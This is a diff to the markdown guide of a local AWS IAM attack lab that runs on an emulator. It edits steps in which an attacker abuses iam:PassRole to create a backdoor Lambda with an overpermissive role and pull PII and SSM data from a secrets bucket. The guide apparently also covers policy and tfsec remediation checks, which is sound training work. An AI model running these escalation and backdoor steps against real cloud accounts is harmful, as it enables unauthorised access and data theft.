@@ -176,6 +176,7 @@ cat /tmp/enum_lambda_policy.json
 # Confirms: attacker is explicitly permitted to invoke
 ```
 
+
 ## Phase 3 — Lambda Pivot Attack
 
 The attacker now knows the function name, the target bucket, and that
@@ -287,7 +288,7 @@ enumeration. With `iam:PassRole` on `Resource:*` in `devops-role`
 they can create their own Lambda with the overpermissive exec role
 attached — giving them a persistent backdoor they fully control.
 
-### Step 1 — Get Floci container IP
+### Step 1 — Get Floci container IP and set lab path
 
 ```bash
 # Shell 3
@@ -295,6 +296,10 @@ FLOCI_IP=$(docker inspect \
   $(docker ps --filter "publish=4566" --format "{{.Names}}" | head -1) \
   --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
 echo "Floci IP: $FLOCI_IP"
+
+# Set lab root — override with IAM_LAB_DIR env var if repo is elsewhere
+LAB_DIR="${IAM_LAB_DIR:-$HOME/iam_lab}"
+echo "Lab dir: $LAB_DIR"
 ```
 
 ### Step 2 — Get the overpermissive role ARN
@@ -317,7 +322,7 @@ aws lambda create-function \
   --runtime nodejs18.x \
   --role "$EXEC_ROLE" \
   --handler index.handler \
-  --zip-file fileb://lambda_src/data_processor.zip \
+  --zip-file "fileb://${LAB_DIR}/lambda_src/data_processor.zip" \
   --environment "Variables={
     BUCKET=company-secrets-vault,
     AWS_ENDPOINT_URL=http://${FLOCI_IP}:4566,
@@ -727,7 +732,3 @@ ls -lh /tmp/attacker_* /tmp/enum_* /tmp/evil_* \
 | `/tmp/evil_pii.json` | PII via evil Lambda |
 | `/tmp/evil_ssm.json` | SSM via evil Lambda |
 | `/tmp/grc_opa_tests.txt` | OPA unit test results 8/8 |
-| `/tmp/grc_conftest_iam_vuln.txt` | conftest IAM — 8 failures |
-| `/tmp/grc_tfsec_vuln.txt` | tfsec — 9 HIGH findings |
-| `/tmp/grc_conftest_iam_fixed.txt` | conftest IAM — 0 failures |
-| `/tmp/grc_tfsec_fixed.txt` | tfsec — No problems detected |
